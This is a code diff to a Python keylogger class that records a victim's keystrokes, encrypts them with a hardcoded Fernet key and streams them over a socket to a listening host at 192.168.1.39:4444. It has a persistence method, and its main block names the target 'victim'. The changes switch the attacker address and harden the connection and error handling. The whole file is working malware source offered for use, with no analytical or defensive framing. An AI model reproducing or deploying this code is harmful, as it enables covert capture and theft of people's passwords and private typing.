@@ -14,7 +14,7 @@ class Keylogger():
 		self.client = None
 		self.client_connect = False
 		self.fail = False
-		self.__crypt = crypt_key
+		self.__crypt = Fernet(crypt_key)
 		self.__key_to_discard = [
 
 			"Key.esc", "Key.ctrl", "Key.alt",
@@ -29,21 +29,15 @@ class Keylogger():
 		try:
 				
 			self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 			Address = (self.__Host, self.__Port)
-
 			self.client.connect(Address)
-
 			print(f"Connected to {self.__Host}:{self.__Port}")
-			
 			self.client_connect = True
 		
 		except ConnectionRefusedError:
 
 			print("Could not connect to the Server")
-
 			print("Make sure the Server is listening for connection...")
-
 			self.fail = True
 		
 	def persistance(self):
@@ -72,15 +66,20 @@ class Keylogger():
 						
 						self.client.sendall(byte_msg)
 
-				except ConnectionRefusedError:
+				except (ConnectionResetError, BrokenPipeError) as error: 
 						
 						print("Server has been disconnected")
+
 						self.client.close()
+						
 						self.client_connect = False
+
+						raise error
+				
 
 if __name__ == '__main__':
 	
-	Host = "192.168.0.199"
+	Host = "192.168.1.39"
 	Port = 4444
 	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
 	victim = Keylogger(Host, Port, KEY)
@@ -99,10 +98,8 @@ if __name__ == '__main__':
 			
 				l.join()
 
-	except KeyboardInterrupt:
-			
-				l.stop()
+	except (KeyboardInterrupt , ConnectionResetError, BrokenPipeError) as e:
 
-				print("Program has been terminated, due to keyboard interruption")
+				print(f"Program has been terminated, due to {e}")
 
 
